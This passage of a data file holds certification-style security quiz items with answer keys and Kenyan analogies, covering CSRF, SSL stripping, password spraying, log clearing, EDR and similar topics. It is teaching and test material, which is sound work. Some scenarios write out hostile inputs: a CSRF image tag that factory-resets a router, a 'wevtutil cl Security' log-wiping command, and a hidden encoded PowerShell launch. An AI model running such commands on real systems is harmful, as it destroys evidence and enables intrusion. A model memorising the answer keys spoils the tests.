    scenario: "An administrator logs into an enterprise router web console and leaves the session active in one browser tab. In another tab, the administrator browses an untrusted discussion forum. An invisible malicious image tag <img src=\"http://192.168.1.1/admin/reboot?action=factory_reset\"> embedded in the forum post loads in the background. Because the administrator's router session cookie is already stored in the browser, the browser automatically includes the authenticated session cookie with the GET request, causing the router to execute a complete factory reset.",
    question: "Which web application vulnerability allowed this exploit, and which defensive mechanisms PREVENT it?",
    options: [
      {
        text: "Cross-Site Request Forgery (CSRF / XSRF); implement Anti-CSRF Synchronizer Tokens and set the session cookie attribute to SameSite=Strict",
        isCorrect: true,
        whyCorrect: "Cross-Site Request Forgery (CSRF) tricks a victim's authenticated browser into sending unauthorized commands to a trusted web application. The application processes the request because the browser automatically attaches the victim's valid session cookie. Defense requires Anti-CSRF Synchronizer Tokens (unique, unpredictable, cryptographically generated tokens per request that an external site cannot forge) and setting the SameSite=Strict or SameSite=Lax cookie attribute to prevent browsers from sending cookies with cross-site requests.",
        whyWrong: ""
      },
      {
        text: "Stored Cross-Site Scripting (XSS); install an endpoint antivirus agent on the client machine",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Stored XSS executes malicious JavaScript inside the victim's browser, whereas CSRF tricks the browser into sending requests to a third-party server. Antivirus does not inspect HTTP cookie policies."
      },
      {
        text: "SQL Injection (SQLi); replace dynamic database queries with stored procedures",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SQLi targets backend relational databases, not forged HTTP state-changing requests."
      },
      {
        text: "Server-Side Request Forgery (SSRF); disable DNS resolution on the border router",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SSRF induces a backend server to make unauthorized requests to internal services, not the client's browser executing unauthorized state changes."
      }
    ],
    technicalRationale: "CSRF exploits the ambient authority of browser-stored cookies. Prevention requires cryptographic request tokens (Anti-CSRF/Synchronizer tokens), SameSite cookie flags, and re-authentication for sensitive actions.",
    kenyanMetaphor: "You walk into a bank in Nairobi and give the teller your signed ID, keeping your active teller window open (authenticated session). A conman sitting next to you slips a forged withdrawal slip with your forged signature into your hand and bumps your arm so the teller stamps it (CSRF). An Anti-CSRF Token is like the teller giving you a secret 6-digit one-time scratch code at the counter that must be written on every slip; without that secret code, the teller rejects any slip instantly!"
  },

  {
    id: 29,
    portion: 6,
    subdomain: "2.5 Cryptographic Attacks / Downgrade & SSL Stripping",
    scenario: "An attacker positions a rogue Wi-Fi access point in an airport lounge. When a passenger types http://www.mybank.com into their mobile browser, the bank server sends a 301 Moved Permanently redirect to https://www.mybank.com. The attacker's on-path proxy intercepts the 301 redirect, establishes an encrypted HTTPS connection with the bank on the backend, but delivers unencrypted plaintext HTTP back to the victim's browser, replacing all internal secure https:// links with http://. The passenger enters their login credentials over unencrypted HTTP, allowing the attacker to harvest them.",
    question: "Which cryptographic attack occurred, and which HTTP response header/protocol standard neutralizes this vulnerability?",
    options: [
      {
        text: "SSL Stripping (Cryptographic Downgrade Attack); implementing HTTP Strict Transport Security (HSTS) with domain preloading",
        isCorrect: true,
        whyCorrect: "SSL Stripping (pioneered by Moxie Marlinspike) downgrades an HTTPS connection to plaintext HTTP by intercepting HTTP-to-HTTPS redirects. HTTP Strict Transport Security (HSTS) (Strict-Transport-Security: max-age=31536000; includeSubDomains; preload) instructs web browsers to only communicate with the website via HTTPS. When preloaded into major browsers' static lists, the browser refuses to send an initial unencrypted HTTP request under any circumstance, completely neutralizing SSL stripping.",
        whyWrong: ""
      },
      {
        text: "Birthday Attack; increasing the hashing algorithm output length from 128-bit to 256-bit",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Birthday attacks exploit hash collision mathematics (finding two inputs producing the same hash), not HTTP-to-HTTPS transport downgrade."
      },
      {
        text: "Replay Attack; embedding random nonces and timestamps in API headers",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Replay attacks retransmit valid captured packets, not on-path TLS stripping."
      },
      {
        text: "Rainbow Table Attack; salting passwords with a 64-bit random salt value",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Rainbow tables are precomputed hash lookup tables used for offline password hash cracking."
      }
    ],
    technicalRationale: "SSL stripping exploits initial plaintext HTTP redirects. HSTS with preloading forces user-agents to rewrite all requests to HTTPS natively before transmission, eliminating on-path protocol downgrade vectors.",
    kenyanMetaphor: "You want to send a box of gold via an armored security truck (HTTPS). A scammer at the depot tells you: 'The armored truck is busy, just load your gold into this open wooden wheelbarrow (HTTP).' If you do, everyone on the highway sees your gold. HSTS Preloading is like a permanent government rule engraved into the depot wall: 'By law, no package may EVER leave this depot in a wheelbarrow; if an armored truck is not available, do not travel at all!'"
  },

  {
    id: 30,
    portion: 6,
    subdomain: "2.4 Password & Authentication Attacks / Password Spraying & Brute Force",
    scenario: "A cloud directory administrator reviews authentication audit logs and notices failed login attempts against 5,000 distinct employee accounts over a 12-hour period. Exactly one login attempt was made per account every 30 minutes using the password Spring2024!. None of the individual accounts exceeded the corporate threshold of 5 failed attempts (which triggers a 30-minute account lockout), allowing the attacker to successfully compromise four user accounts without locking any users out or triggering standard brute-force threshold alerts.",
    question: "Which password attack technique was executed, and which defense provides the MOST robust protection against this method?",
    options: [
      {
        text: "Password Spraying; deploy Multi-Factor Authentication (MFA) and AI-driven Smart Lockout / Risk-Based Conditional Access",
        isCorrect: true,
        whyCorrect: "Password Spraying is a horizontal attack where an adversary attempts a few common passwords (e.g., Company2024!, Welcome123) across thousands of different user accounts, deliberately staying below individual account lockout thresholds. Defenses include Multi-Factor Authentication (MFA / FIDO2 WebAuthn)—which blocks the login even if the attacker guesses the password—and Smart Lockout / Behavioral Risk-Based Conditional Access (which tracks IP reputation and global spray patterns across accounts).",
        whyWrong: ""
      },
      {
        text: "Dictionary Brute Force Attack; reduce the account lockout threshold from 5 attempts to 1 attempt",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Lowering lockout threshold to 1 attempt creates a severe Denial of Service (DoS) vulnerability where an attacker can lock out the entire company effortlessly."
      },
      {
        text: "Credential Stuffing; mandate weekly password resets for all users",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Credential stuffing tests known username/password pairs stolen from third-party breaches. Weekly password resets lead to user password fatigue and weaker predictable passwords."
      },
      {
        text: "Rainbow Table Attack; increase the CPU iteration count in PBKDF2",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Rainbow tables are used for offline hash cracking, whereas password spraying is an active online authentication attack against cloud identity endpoints."
      }
    ],
    technicalRationale: "Password spraying avoids vertical account lockout triggers. Detection relies on tenant-wide anomalous login velocity, IP clustering, and enforcement of phishing-resistant MFA (FIDO2/WebAuthn).",
  },

  // ==========================================
  // PORTION 7 (Q31 - Q35)
  // ==========================================
  {
    id: 31,
    portion: 7,
    subdomain: "2.6 Indicators of Compromise (IoCs) / Identity Anomalies (Impossible Travel)",
    scenario: "A corporate Cloud Access Security Broker (CASB) generates a high-severity alert for a senior finance executive's cloud identity account. Audit logs show that the user successfully authenticated to Microsoft 365 from an IP address in Nairobi, Kenya at 09:15 AM EAT. Exactly 25 minutes later at 09:40 AM EAT, the same account successfully authenticated to Salesforce from an IP address in Frankfurt, Germany. No corporate VPN or proxy egress points were utilized.",
    question: "Which specific identity Indicator of Compromise (IoC) was detected, and what automated remediation policy should the Identity Provider (IdP) immediately trigger?",
    options: [
      {
        text: "Impossible Travel (Anomalous Geolocation Velocity); immediately terminate all active sessions, revoke OAuth refresh tokens, and enforce step-up Phishing-Resistant MFA",
        isCorrect: true,
        whyCorrect: "Impossible Travel (also known as anomalous geographical velocity) occurs when two consecutive authentication events for the same account occur from distinct geographic locations separated by a distance that is physically impossible to travel within the elapsed timeframe (e.g., Nairobi to Frankfurt in 25 minutes). Automated IdP response policies must instantly terminate active sessions, invalidate refresh tokens, and force password resets or step-up FIDO2/biometric MFA.",
        whyWrong: ""
      },
      {
        text: "DNS Sinkholing; redirect all German IP addresses to an internal loopback adapter",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNS sinkholing redirects malicious botnet C2 domains, not user authentication anomalies."
      },
      {
        text: "ARP Cache Poisoning; enable Dynamic ARP Inspection (DAI) on the core datacenter switch",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DAI mitigates Layer 2 LAN ARP spoofing, not cloud SaaS login velocity anomalies."
      },
      {
        text: "Evil Twin Attack; rotate the corporate wireless pre-shared key (PSK)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Evil Twin attacks target local 802.11 Wi-Fi networks, not cloud Identity Provider geolocation telemetry."
      }
    ],
    technicalRationale: "Identity threat detection and response (ITDR) engines analyze user and entity behavior analytics (UEBA). Impossible travel signals compromised session tokens or shared credentials, requiring automated session revocation.",
    kenyanMetaphor: "Your friend Juma buys a cup of tea at a cafe in Nairobi at 10:00 AM using his M-Pesa account. At 10:15 AM, the exact same M-Pesa account is used to withdraw Ksh 50,000 at an agent in Mombasa (Impossible Travel—no vehicle or flight can cover Nairobi to Mombasa in 15 minutes!). The fraud detection system must instantly freeze the account and demand biometric facial recognition before allowing another cent to move!"
  },

  {
    id: 32,
    portion: 7,
    subdomain: "2.6 Defense Evasion & Log Tampering / Windows Event ID 1102",
    scenario: "A SOC analyst investigating an endpoint alert discovers that an attacker gained local administrator privileges on a Windows database server. Shortly after compromise, the attacker executed the command wevtutil cl Security via an elevated PowerShell prompt to erase all traces of lateral movement. Immediately, the SIEM generated an alert displaying Windows Event ID 1102: \"The audit log was cleared\".",
    question: "Which defense evasion tactic was attempted, and which architectural log-management control PREVENTS attackers from destroying historical log evidence?",
    options: [
      {
        text: "Log Clearing / Log Tampering; implement real-time, write-once (WORM) centralized SIEM log forwarding via syslog/TLS",
        isCorrect: true,
        whyCorrect: "Attackers frequently attempt Log Clearing (MITRE ATT&CK T1070) using tools like wevtutil to hinder post-incident forensics. However, Windows generates Event ID 1102 whenever the Security log is cleared. To prevent loss of evidence, enterprises must configure real-time centralized log shipping (SIEM / Syslog-NG over TLS) with Immutable / Write-Once-Read-Many (WORM) storage, ensuring that even if an attacker erases local logs, the central repository remains intact.",
        whyWrong: ""
      },
      {
        text: "SQL Injection; convert dynamic queries to Parameterized Statements",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SQLi targets database query parsing, not operating system event log tampering."
      },
      {
        text: "Cross-Site Scripting (XSS); deploy Content Security Policy (CSP) headers",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "XSS is a web application script injection vulnerability, completely unrelated to Windows event logs."
      },
      {
        text: "VLAN Hopping; disable dynamic trunking protocol (DTP) on access ports",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "VLAN hopping exploits trunk protocol negotiation on Ethernet switches, not OS log deletion."
      }
    ],
    technicalRationale: "Local event logs are vulnerable to administrative tampering. Enterprise logging architectures require append-only, tamper-evident remote log collectors with non-repudiation controls.",
    kenyanMetaphor: "A corrupt storekeeper steals 10 sacks of sugar from the warehouse and then burns the physical paper inventory ledger with a match (Log Clearing). However, the company accountant had already photocopied each page and locked it inside the bank vault across town in real time (Centralized Immutable SIEM). Burning the warehouse book achieves nothing because the bank records are already permanently saved!"
  },

  {
    id: 33,
    portion: 7,
    subdomain: "2.7 Network Architecture & Segmentation / Multi-Tier Screened Subnets (DMZ)",
    scenario: "An organization is designing a payment-processing infrastructure to comply with PCI DSS requirements. The architecture includes public-facing Web Servers, internal Application Business-Logic Servers, and a backend Database Server storing encrypted credit cardholder data. The compliance requirement mandates that the Database Server MUST NEVER be directly accessible from the public Internet or from the public-facing Web Servers.",
    question: "Which network segmentation architecture and firewall rule placement satisfies this requirement?",
    options: [
      {
        text: "A Three-Tier Architecture with a Screened Subnet (DMZ); Web servers reside in the DMZ, Application servers reside in a protected Middle Tier, and Database servers reside in an isolated Backend Subnet with strict East-West firewall rules permitting traffic ONLY from the Application tier",
        isCorrect: true,
        whyCorrect: "CompTIA and PCI DSS require multi-tier segmentation (Screened Subnet / DMZ). The Web Tier is placed in the DMZ (accessible from WAN on 443). The Application Tier sits in an internal subnet (accessible only by Web on specific app ports). The Database Tier resides in a deeply isolated backend subnet that only accepts connections from the Application servers (e.g., port 1433/3306), completely blocking direct communication from the DMZ or Internet.",
        whyWrong: ""
      },
      {
        text: "A Flat Network Architecture; all servers share a single /24 broadcast domain with host-based software firewalls",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Flat networks allow any compromised web server to immediately pivot directly to databases on the same broadcast domain."
      },
      {
        text: "A Split-Tunnel VPN Architecture; all database queries route through employee home routers",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Split-tunnel VPNs route traffic through untrusted home connections, creating massive security risks for cardholder data."
      },
      {
        text: "A Hub-and-Spoke Topology with no interior firewalls, relying entirely on SSL certificates",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Hub-and-spoke without interior firewalls allows unrestricted lateral movement across internal network tiers."
      }
    ],
    technicalRationale: "Zero Trust and PCI DSS mandate defence-in-depth through multi-tiered zoning, micro-segmentation, and strict East-West Layer 4/Layer 7 firewall access control lists (ACLs).",
    kenyanMetaphor: "State House Nairobi security layout: Visitors from the public road are only allowed into the outer reception gatehouse (DMZ Web Tier). Only verified staff can enter the middle administrative office building (Application Tier). The President's private briefing room and treasury safe (Database Tier) is in the deepest underground bunker, accessible only by the inner security chief who entered through the admin building—never directly from the front gatehouse!"
  },

  {
    id: 34,
    portion: 7,
    subdomain: "2.8 Vulnerability Assessment & Scoring / CVSS v3.1 Metrics",
    scenario: "A vulnerability management analyst reviews an automated Nessus scan report for an edge-facing VPN gateway. The scan reports a critical vulnerability with the following CVSS v3.1 vector string: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H. The overall Base Score is calculated at 9.8 (Critical).",
    question: "What does this specific CVSS metric string indicate regarding the exploitability and impact of the vulnerability?",
    options: [
      {
        text: "The vulnerability can be exploited over the Network (AV:N) with Low complexity (AC:L), requires No Privileges (PR:N) and No User Interaction (UI:N), and results in High impact to Confidentiality, Integrity, and Availability",
        isCorrect: true,
        whyCorrect: "In CVSS v3.1: AV:N = Attack Vector: Network (remotely exploitable); AC:L = Attack Complexity: Low (no specialized conditions needed); PR:N = Privileges Required: None (unauthenticated); UI:N = User Interaction: None (zero victim clicks required); C:H/I:H/A:H = High impact across Confidentiality, Integrity, and Availability. This combination yields a 9.8 Critical score, representing the most urgent remote code execution risk.",
        whyWrong: ""
      },
      {
        text: "The vulnerability requires Physical access (AV:P), High Privileges (PR:H), and User Interaction (UI:R)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Misidentifies AV:N (Network) as Physical, PR:N (None) as High, and UI:N (None) as Required."
      },
      {
        text: "The vulnerability is Local-only (AV:L) and only impacts Availability (A:H) while Confidentiality is None (C:N)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Misidentifies AV:N as Local and claims C:N when the vector clearly states C:H."
      },
      {
        text: "The vulnerability requires an Adjacent Network (AV:A) and High Attack Complexity (AC:H)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Misidentifies AV:N as Adjacent and AC:L as High complexity."
      }
    ],
    technicalRationale: "CVSS v3.1 Base Metrics capture exploitability (AV, AC, PR, UI) and impact (C, I, A, Scope). Remotely exploitable vulnerabilities with no privileges or interaction represent top-tier remediation priorities.",
    kenyanMetaphor: "An engineering inspection report on a bridge: AV:N means anyone driving from any highway in Kenya can reach it; AC:L means you don't need heavy machinery to damage it; PR:N means you don't need a special government pass to touch it; UI:N means the bridge will collapse on its own without any driver making a mistake; C:H/I:H/A:H means total destruction! This bridge requires immediate emergency closure!"
  },

  {
    id: 35,
    portion: 7,
    subdomain: "2.8 Threat Hunting & Detection Engineering / YARA vs Sigma Rules",
    scenario: "A cybersecurity threat hunting team investigates an active APT intrusion. The team wants to scan all endpoint memory dumps and file systems across 10,000 workstations specifically looking for unique hex byte sequences and malicious text strings associated with a proprietary backdoor. Concurrently, they need a vendor-agnostic log signature rule format to query their SIEM for suspicious powershell.exe -encodedcommand executions across different log engines (Splunk, Elastic, Microsoft Sentinel).",
    question: "Which two detection rule formats should the threat hunting team deploy for these respective tasks?",
    options: [
      {
        text: "Deploy YARA rules for memory/file string and byte-sequence scanning; deploy Sigma rules for standardized, vendor-agnostic SIEM log detection queries",
        isCorrect: true,
        whyCorrect: "YARA (\"Yet Another Recursive Acronym\") is the industry-standard tool for pattern-matching against files and volatile memory (RAM), using rules based on textual and binary hex patterns to classify malware. Sigma is an open, standardized, generic signature format for log events, allowing security engineers to write detection rules once and convert them into queries for Splunk, Elastic, Sentinel, QRadar, etc.",
        whyWrong: ""
      },
      {
        text: "Deploy Snort rules for memory scanning; deploy CSS stylesheets for SIEM queries",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Snort is a network IDS rule format, not a memory scanner, and CSS is for website web design formatting."
      },
      {
        text: "Deploy NetFlow for file string scanning; deploy RADIUS for SIEM correlation",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "NetFlow provides Layer 3/4 traffic flow metadata, and RADIUS is an authentication protocol."
      },
      {
        text: "Deploy BGP route filters for memory scanning; deploy DNSSEC for log parsing",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "BGP and DNSSEC are routing and domain security protocols, not endpoint memory or SIEM signature languages."
      }
    ],
  },

  // ==========================================
  // PORTION 8 (Q36 - Q40)
  // ==========================================
  {
    id: 36,
    portion: 8,
    subdomain: "2.7 Host & Network Security Mitigations / NAC & Posture Assessment",
    scenario: "An organization enforces 802.1X Network Access Control (NAC) across all wired Ethernet and corporate Wi-Fi connections. A remote employee connects a company-issued laptop to the headquarters network after being offline for 90 days. The NAC policy server performs a health check and discovers that the laptop's OS is missing critical security patches, the local host firewall is disabled, and the EDR agent signature database is out of date.",
    question: "What mechanism did the NAC solution perform, and what automated action should the NAC switch port enforce?",
    options: [
      {
        text: "Posture Assessment (Health Check); assign the laptop to an isolated Quarantine / Remediation VLAN with access restricted exclusively to internal update and patch management servers",
        isCorrect: true,
        whyCorrect: "Network Access Control (NAC) uses persistent or dissolvable agents to perform Posture Assessments (verifying patch status, antivirus definitions, firewall state, and encryption). If an endpoint fails posture compliance, the NAC server instructs the access switch or wireless controller via RADIUS (CoA - Change of Authorization) to place the device into a restricted Quarantine/Remediation VLAN where it can only communicate with internal patch servers (e.g., WSUS, SCCM, Antivirus servers) to become compliant before gaining production network access.",
        whyWrong: ""
      },
      {
        text: "ARP Poisoning; broadcast gratuitous ARP replies across the default gateway",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "ARP poisoning is a malicious Layer 2 MITM attack, not an administrative compliance mechanism."
      },
      {
        text: "Domain Hijacking; modify the authoritative Name Server records at the registrar",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Domain hijacking is an external DNS registrar compromise, completely unrelated to local network admission."
      },
      {
        text: "SSL Stripping; redirect all HTTP traffic to an unencrypted public proxy",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SSL stripping is an on-path cryptographic downgrade attack."
      }
    ],
    technicalRationale: "802.1X NAC solutions enforce pre-admission posture validation using agent or agentless health checks, isolating non-compliant hosts into remediation VLANs via RADIUS Dynamic VLAN Assignment.",
    kenyanMetaphor: "You arrive at the entrance of a high-security airport terminal in Nairobi. Security officers inspect your health yellow fever card and luggage (Posture Assessment). If your yellow fever vaccine card is expired, they do not let you board the main flight; instead, they escort you to a designated airport medical holding clinic (Quarantine/Remediation VLAN) to get your booster shot before you are cleared to enter the main departure lounge!"
  },

  {
    id: 37,
    portion: 8,
    subdomain: "2.7 Data-at-Rest Security & Hardware Cryptography / TPM & Full Disk Encryption",
    scenario: "An executive's enterprise laptop containing confidential merger and acquisition documents is stolen from a hotel room. The thief removes the NVMe SSD from the laptop, mounts it inside an external USB hard drive enclosure, and connects it to a forensic hacking workstation running Linux to read the raw filesystem partition. The forensic workstation displays only encrypted ciphertext and is unable to mount or read any volume files.",
    question: "Which cryptographic hardware component and software mitigation rendered the stolen storage drive unreadable?",
    options: [
      {
        text: "Full Disk Encryption (FDE / BitLocker) cryptographically tied to the motherboard's Trusted Platform Module (TPM 2.0) chip",
        isCorrect: true,
        whyCorrect: "Full Disk Encryption (FDE) (such as Microsoft BitLocker or Apple FileVault) encrypts all data-at-rest across the entire physical volume using AES-XTS 256. When bound to a hardware Trusted Platform Module (TPM 2.0), the decryption key is securely sealed inside the TPM hardware chip and will only be released if the host platform boots normally with platform firmware integrity verified (Secure Boot PCR validation). If the drive is physically extracted and connected to another computer, the decryption key remains locked in the original laptop's TPM chip, leaving the data permanently unreadable.",
        whyWrong: ""
      },
      {
        text: "Content Security Policy (CSP) deployed on the local web browser",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "CSP is an HTTP response header that stops XSS, having zero effect on offline physical disk security."
      },
      {
        text: "Dynamic ARP Inspection (DAI) enabled on the local network switch",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DAI inspects ARP packets on Ethernet switches, not data stored on local NVMe drives."
      },
      {
        text: "DNSSEC configured on the root authoritative nameserver",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNSSEC cryptographically signs DNS records, completely unrelated to hard drive encryption."
      }
    ],
    technicalRationale: "TPM provides hardware-based root of trust, cryptographic key generation, and Platform Configuration Register (PCR) measurements to ensure drive decryption keys are never exposed in plaintext outside the authenticated hardware boundary.",
    kenyanMetaphor: "You store your money in a heavy digital steel safe inside your shop. The lock mechanism is physically fused into the shop's reinforced concrete foundation (TPM chip). If a burglar breaks in at night and rips the safe box off the wall and carries it home, the safe remains permanently locked because the digital key is permanently embedded inside the shop's concrete floor!"
  },

  {
    id: 38,
    portion: 8,
    subdomain: "2.6 Security Operations & Incident Automation / SOAR Playbooks",
    scenario: "At 02:30 AM on a Sunday, a corporate EDR sensor detects a workstation executing malicious ransomware encryption routines. The endpoint alert is ingested by the enterprise Security Orchestration, Automation, and Response (SOAR) platform. Without human analyst intervention, the SOAR platform executes an automated workflow: it immediately network-isolates the compromised workstation via EDR API, disables the user's Active Directory account via LDAP, generates a high-priority incident ticket in Jira, and blocks the external C2 IP address on the perimeter Palo Alto firewall.",
    question: "What incident response capability was demonstrated by the security platform?",
    options: [
      {
        text: "Execution of an Automated SOAR Incident Response Playbook",
        isCorrect: true,
        whyCorrect: "Security Orchestration, Automation, and Response (SOAR) platforms aggregate alerts from SIEMs and security tools, executing pre-programmed Playbooks (automated workflows) via APIs. Playbooks execute rapid machine-speed containment actions—such as isolating infected hosts, revoking user credentials, updating firewall blocklists, and creating ticketing records—reducing Mean Time to Remediate (MTTR) from hours to milliseconds without requiring human 24/7 manual intervention.",
        whyWrong: ""
      },
      {
        text: "Manual Penetration Testing using Metasploit",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Manual penetration testing involves human ethical hackers looking for security flaws."
      },
      {
        text: "Execution of an Offline Password Cracking Dictionary Attack",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Password cracking is an adversary technique to guess credentials, not automated incident response."
      },
      {
        text: "A Social Engineering Phishing Simulation Drill",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Phishing drills test human employee awareness, not machine-speed automated API orchestration."
      }
    ],
    technicalRationale: "SOAR platforms automate repetitive incident response tasks through playbooks, orchestrating disparate security tools (EDR, SIEM, IAM, Firewalls) via REST APIs to drastically reduce Mean Time to Contain (MTTC).",
    kenyanMetaphor: "A modern automated smart farm in Naivasha. If a water pipe bursts at 03:00 AM, the smart IoT sensor detects the leak (SIEM alert), instantly triggers an automated motorized valve to shut off the main borehole pump (EDR isolation), turns on the emergency drainage pumps (firewall block), and sends an automated SMS alert with an incident report to the farm manager's phone (SOAR Playbook)—all happening in 2 seconds while everyone is asleep!"
  },

  {
    id: 39,
    portion: 8,
    subdomain: "2.1 Data Sanitization & Media Destruction / NIST SP 800-88 Rev 1 Standards",
    scenario: "A cloud service provider is decommissioning 500 enterprise Solid-State Drives (SSDs) containing sensitive customer financial data. A junior technician suggests using a powerful electromagnetic degausser to erase the drives. The lead security engineer rejects this proposal, explaining that degaussing is completely ineffective on flash memory and insists on compliance with NIST SP 800-88 Rev 1.",
    question: "Why does degaussing FAIL on Solid-State Drives, and which sanitization methods are approved for SSDs under NIST SP 800-88?",
    options: [
      {
        text: "SSDs store data in integrated circuit flash transistors (NAND floating gates) rather than magnetic platters; approved methods are Purging (ATA Secure Erase / Cryptographic Erase) or Physical Destruction (Shredding/Disintegration to 2mm particles)",
        isCorrect: true,
        whyCorrect: "Degaussing uses intense magnetic fields to disrupt magnetic domains on traditional magnetic storage media (HDDs, magnetic tape). Because SSDs, NVMe drives, and USB flash drives store electrical charges in non-volatile semiconductor NAND flash memory, magnets have zero effect on them. Under NIST SP 800-88 Rev 1, media sanitization categories are: Clear (logical overwrite, ineffective on wear-leveled SSD blocks); Purge (ATA Secure Erase, NVMe Sanitize, Cryptographic Erase - CE); Destroy (physical shredding, incineration, or disintegration into sub-2mm particles).",
        whyWrong: ""
      },
      {
        text: "SSDs use optical lasers; approved methods are washing with soapy water and polishing with a cloth",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SSDs do not use optical lasers (which are used on CDs/DVDs/Blu-rays), and soapy water does not sanitize data."
      },
      {
        text: "SSDs store data on paper punch-cards; approved methods are standard recycling bins",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Punch-cards are 1960s mechanical media, not modern semiconductor flash storage."
      },
      {
        text: "SSDs require a 3-pass DoD 5220.22-M magnetic wipe followed by cooling in liquid nitrogen",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Magnetic overwrite patterns (DoD 5220.22-M) cannot reliably overwrite hidden or wear-leveled NAND blocks on SSDs."
      }
    ],
    technicalRationale: "NIST SP 800-88 Rev 1 defines sanitization levels: Clear, Purge, and Destroy. Flash memory requires specialized firmware Purge commands (Cryptographic Erase/Sanitize) or physical cross-cut disintegration because wear-leveling algorithms prevent standard block-level overwriting.",
    kenyanMetaphor: "Degaussing is like using a powerful giant magnet to erase an old cassette tape or VHS tape (magnetic media). If you wave a giant magnet over an engraved stone tablet or a digital flash USB stick (semiconductor flash chips), the magnet does nothing! To completely destroy the stone tablet, you must feed it into a heavy industrial rock crusher until it is reduced to fine sand (Physical Shredding/Disintegration)!"
  },

  {
    id: 40,
    portion: 8,
    subdomain: "2.5 Network Threat Mitigation & Architecture / DNS Sinkholing & DGA Detection",
    scenario: "A network security engineer discovers that an advanced banking trojan has infected multiple corporate workstations. The malware utilizes a Domain Generation Algorithm (DGA) to query 500 pseudo-randomly generated domain names per hour (e.g., x89qzk1a.biz, pl93mxa.info) seeking its active Command and Control (C2) server. To neutralize the trojan and identify all infected internal hosts without alerting the attackers, the engineer configures the corporate recursive DNS server to intercept these queries.",
    question: "Which defensive technique intercepts these malicious DNS queries and resolves them to a controlled internal monitoring address?",
    options: [
      {
        text: "DNS Sinkholing; the internal DNS server intercepts queries for known malicious/DGA domains and returns a controlled decoy IP address, severing C2 while logging the source IP of all infected hosts",
        isCorrect: true,
        whyCorrect: "DNS Sinkholing is a defensive technique where an authoritative or recursive DNS resolver is configured to supply false, controlled IP addresses (such as a local loopback 127.0.0.1 or an internal honeypot/monitoring server) for known malicious domains, botnet C2 nodes, or DGA patterns. This achieves two critical objectives: (1) it severs outbound communication between the malware and the threat actor's actual C2 server, and (2) it creates an audit trail of every internal workstation IP querying the sinkhole, pinpointing infected endpoints for immediate remediation.",
        whyWrong: ""
      },
      {
        text: "Typosquatting; registering misspelled variations of the company's public website",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Typosquatting is an offensive domain spoofing tactic targeting human spelling mistakes, not an enterprise DNS defense."
      },
      {
        text: "ARP Poisoning; flooding the core switch with broadcast ARP replies",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "ARP poisoning is an internal Layer 2 attack, not a DNS defensive control."
      },
      {
        text: "Pass-the-Hash; extracting NTLM password hashes from memory",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Pass-the-Hash is an offensive credential theft technique targeting Windows LSASS memory."
      }
    ],
  },

  // ==========================================
  // PORTION 9 (Q41 - Q45)
  // ==========================================
  {
    id: 41,
    portion: 9,
    subdomain: "2.7 Endpoint Security & Detection / EDR Behavioral Analysis vs Legacy Antivirus",
    scenario: "An employee opens an email attachment named Invoice_March.docx. The document exploits an unpatched Microsoft Office zero-day vulnerability to spawn a child process WINWORD.EXE -> powershell.exe -w hidden -nop -enc ..., which attempts to scrape credentials from system memory. Traditional signature-based antivirus on the endpoint reports zero alerts because the payload binary is completely novel and has no matching hash in the signature database. However, the corporate security agent detects the anomalous parent-child process tree relationship in real time, kills the child process, and immediately isolates the endpoint from the network.",
    question: "Which endpoint security technology stopped this attack, and what detection methodology did it employ?",
    options: [
      {
        text: "Endpoint Detection and Response (EDR); utilizing Behavioral Heuristics and Process Tree Telemetry Analysis",
        isCorrect: true,
        whyCorrect: "Endpoint Detection and Response (EDR) goes beyond static file hashes by continuously recording endpoint activity and telemetry. It analyzes behavioral heuristics—such as suspicious parent-child process lineages (e.g., a word processor executing an obfuscated PowerShell script) and memory injection attempts. Upon detecting anomalous behavior indicative of MITRE ATT&CK techniques, EDR can autonomously terminate the process tree and isolate the host from the network.",
        whyWrong: ""
      },
      {
        text: "Static Signature-based Antivirus; scanning the file hash against an offline MD5 checksum database",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Static signature antivirus only detects known threats with pre-calculated hashes."
      },
      {
        text: "Content Filtering Proxy; inspecting SSL/TLS certificates on port 443",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Web proxies inspect HTTP/S network traffic, not local operating system process executions."
      },
      {
        text: "Dynamic ARP Inspection (DAI); validating switchport ARP bindings",
        isCorrect: false,
        whyCorrect: "",
